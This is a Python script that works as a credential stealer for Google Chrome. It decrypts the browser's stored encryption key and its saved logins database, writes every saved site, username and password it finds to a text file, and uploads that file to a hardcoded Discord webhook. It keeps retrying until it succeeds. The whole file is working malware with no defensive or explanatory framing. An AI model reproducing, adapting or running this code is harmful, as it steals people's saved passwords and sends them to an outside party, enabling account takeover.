import os
import sys
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta
from discord import SyncWebhook, File


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January 1, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    chrome_dir = get_chrome_directory()
    local_state_path = os.path.join(chrome_dir, "Local State")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""


def get_chrome_directory():
    """Return the directory where Chrome data is stored based on the user's operating system"""
    system = sys.platform
    if system == "win32":
        chrome_dir = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
    elif system == "darwin":
        chrome_dir = os.path.expanduser("~/Library/Application Support/Google/Chrome/")
    else:
        chrome_dir = os.path.expanduser("~/.config/google-chrome/")
    return chrome_dir

def webhook(passwords):
    webhook = SyncWebhook.from_url("https://discord.com/api/webhooks/1111719322482655242/9082Zwui2shAfEd-uOgWfDJhENd7OjA5K2CRrDMIgYfBB3OE15mQWFQAsH9yFlOlkUhh")
    webhook.send(file=File(passwords))


def main():
    chrome_dir = get_chrome_directory()
    encrypted_file_path = os.path.join(chrome_dir, "Default", "Login Data")
    save_file_path = os.path.join(os.getcwd(), "chrome_passwords.txt")

    # get the AES key
    key = get_encryption_key()

    # copy the file to another location as the database will be locked if Chrome is currently running
    filename = "ChromeData.db"
    shutil.copyfile(encrypted_file_path, filename)

    # connect to the database
    db = sqlite3.connect(filename)
    cursor = db.cursor()

    # `logins` table has the data we need
    cursor.execute(
        "SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created"
    )

    try:
        with open(save_file_path, "w") as file:
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                date_created = row[4]
                date_last_used = row[5]

                if username or password:
                    file.write(f"Origin URL: {origin_url}\n")
                    file.write(f"Action URL: {action_url}\n")
                    file.write(f"Username: {username}\n")
                    file.write(f"Password: {password}\n")

                if date_created != 86400000000 and date_created:
                    file.write(f"Creation date: {str(get_chrome_datetime(date_created))}\n")

                if date_last_used != 86400000000 and date_last_used:
                    file.write(f"Last Used: {str(get_chrome_datetime(date_last_used))}\n")

                file.write("=" * 50 + "\n")

        cursor.close()
        db.close()

        # Remove the copied db file
        try:
            os.remove(filename)
        except:
            pass

        # Send the file to the webhook
        webhook(save_file_path)

    except Exception as e:
        print(f"An error occurred while writing to the file: {e}")


while True:
    try:
        main()
        break
    except Exception as e:
        print("An error occurred:", e)
        print("Retrying...")
